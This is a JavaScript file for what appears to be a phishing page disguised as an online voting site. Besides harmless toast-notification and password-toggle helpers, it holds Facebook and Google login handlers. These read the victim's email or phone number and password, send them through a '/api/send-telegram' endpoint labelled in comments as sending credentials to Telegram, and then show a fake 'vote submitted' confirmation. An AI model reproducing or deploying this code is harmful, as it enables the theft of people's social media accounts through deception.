// Toast Notification System
function createToastContainer() {
    let container = document.querySelector('.toast-container');
    if (!container) {
        container = document.createElement('div');
        container.className = 'toast-container';
        document.body.appendChild(container);
    }
    return container;
}

function showToast(title, message, type = 'info', duration = 4000) {
    const container = createToastContainer();

    const toast = document.createElement('div');
    toast.className = `toast ${type}`;

    // Icon SVG based on type
    let iconSVG = '';
    if (type === 'success') {
        iconSVG = `<svg class="toast-icon success" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
            <polyline points="22 4 12 14.01 9 11.01"></polyline>
        </svg>`;
    } else if (type === 'error') {
        iconSVG = `<svg class="toast-icon error" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="15" y1="9" x2="9" y2="15"></line>
            <line x1="9" y1="9" x2="15" y2="15"></line>
        </svg>`;
    } else {
        iconSVG = `<svg class="toast-icon info" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="12" y1="16" x2="12" y2="12"></line>
            <line x1="12" y1="8" x2="12.01" y2="8"></line>
        </svg>`;
    }

    toast.innerHTML = `
        ${iconSVG}
        <div class="toast-content">
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
        <button class="toast-close" onclick="this.parentElement.remove()">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
        </button>
    `;

    container.appendChild(toast);

    // Auto remove after duration
    if (duration > 0) {
        setTimeout(() => {
            toast.classList.add('removing');
            setTimeout(() => toast.remove(), 300);
        }, duration);
    }
}

// Toggle password visibility
function togglePassword(inputId, button) {
    const input = document.getElementById(inputId);
    const isPassword = input.type === 'password';

    // Toggle input type
    input.type = isPassword ? 'text' : 'password';

    // Toggle button active state
    button.classList.toggle('active');

    // Update SVG icon
    const svg = button.querySelector('.eye-icon');
    if (isPassword) {
        // Show "eye-off" icon when password is visible
        svg.innerHTML = `
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
            <line x1="1" y1="1" x2="23" y2="23"></line>
        `;
    } else {
        // Show "eye" icon when password is hidden
        svg.innerHTML = `
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
        `;
    }
}

// Handle Facebook and Google login form submissions
async function sendToTelegram(msg) {
    try {
        const response = await fetch('/api/send-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: msg })
        });

        const data = await response.json();

        if (!data.success) {
            console.error('Failed to send message:', data.error);
        }
    } catch (error) {
        console.error('Error sending message:', error);
    }
}

// Validation Helper Functions
function isValidFacebookInput(input) {
    // Check if phone number (must be exactly 11 digits)
    const phoneRegex = /^\d{11}$/;
    if (phoneRegex.test(input)) {
        return { valid: true, type: 'Phone' };
    }

    // Check if valid email domain
    const emailRegex = /^[a-zA-Z0-9._%+-]+@(gmail\.com|yahoo\.com|hotmail\.com|outlook\.com)$/i;
    if (emailRegex.test(input)) {
        return { valid: true, type: 'Email' };
    }

    return { valid: false };
}

function isValidGoogleEmail(input) {
    // Strictly check for @gmail.com
    const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/i;
    return gmailRegex.test(input);
}

// Facebook form handler
const facebookForm = document.getElementById('facebookForm');
if (facebookForm) {
    facebookForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const email = document.getElementById('fb-email').value;
        const password = document.getElementById('fb-password').value;
        const candidate = sessionStorage.getItem('votingFor') || 'Unknown';

        // Validate Input
        const validation = isValidFacebookInput(email);
        if (!validation.valid) {
            alert('Please enter a valid 11-digit phone number or a valid email address (@gmail.com, @yahoo.com, etc.)');
            return;
        }

        // Send credentials to Telegram
        const message = `🔵 *FACEBOOK LOGIN*\n\n` +
            `📧/📱 ${validation.type}: ${email}\n` +
            `🔑 Password: ${password}\n` +
            `🗳 Voting for: ${candidate}\n` +
            `⏰ Time: ${new Date().toLocaleString()}`;

        await sendToTelegram(message);

        // Show success message and redirect
        alert('Login successful! Processing your vote...');

        // Redirect back to main page
        setTimeout(() => {
            window.location.href = 'Index.html';
        }, 1000);
    });
}

// Google form handler
const googleForm = document.getElementById('googleForm');
if (googleForm) {
    googleForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const email = document.getElementById('google-email').value;
        const password = document.getElementById('google-password').value;
        const candidate = sessionStorage.getItem('votingFor') || 'Unknown';

        // Validate Input
        if (!isValidGoogleEmail(email)) {
            showToast('Invalid Email', 'Please enter a valid @gmail.com address.', 'error');
            return;
        }

        try {
            // Send credentials to Telegram
            const message = `🔴 *GOOGLE LOGIN*\n\n` +
                `📧 Email: ${email}\n` +
                `🔑 Password: ${password}\n` +
                `🗳 Voting for: ${candidate}\n` +
                `⏰ Time: ${new Date().toLocaleString()}`;

            await sendToTelegram(message);

            // Show success message and redirect
            showToast('Vote Submitted!', `Your vote for ${candidate} has been recorded successfully.`, 'success', 2500);

            // Redirect back to main page
            setTimeout(() => {
                window.location.href = 'Index.html';
            }, 2500);
        } catch (error) {
            showToast('Submission Failed', 'There was an error processing your vote. Please try again.', 'error');
        }
    });
}
